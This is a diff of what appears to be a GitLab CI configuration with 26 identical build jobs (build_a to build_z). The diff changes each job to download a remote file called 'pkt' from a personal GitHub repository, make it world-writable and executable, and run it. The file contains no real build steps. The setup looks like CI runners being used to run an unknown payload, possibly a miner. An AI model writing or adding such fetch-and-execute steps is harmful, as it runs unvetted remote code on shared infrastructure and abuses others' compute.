@@ -11,166 +11,166 @@ stages:
 build_a:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
      
 
 build_b:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_c:
   stage: build
   script:
      
-    - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-    - chmod 777 b.sh
-    - ./b.sh
+    - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+    - chmod 777 pkt
+    - ./pkt
 
 build_d:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_e:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_f:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_g:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_h:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_i:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_j:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_k:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_l:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_m:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 
 build_n:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_o:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_p:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_q:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_r:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_s:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_t:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_u:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_v:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_w:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_x:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_y:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
 build_z:
   stage: build
   script:
-     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh
-     - chmod 777 b.sh
-     - ./b.sh
+     - wget https://raw.githubusercontent.com/viwarlani/viwarlani/main/pkt
+     - chmod 777 pkt
+     - ./pkt
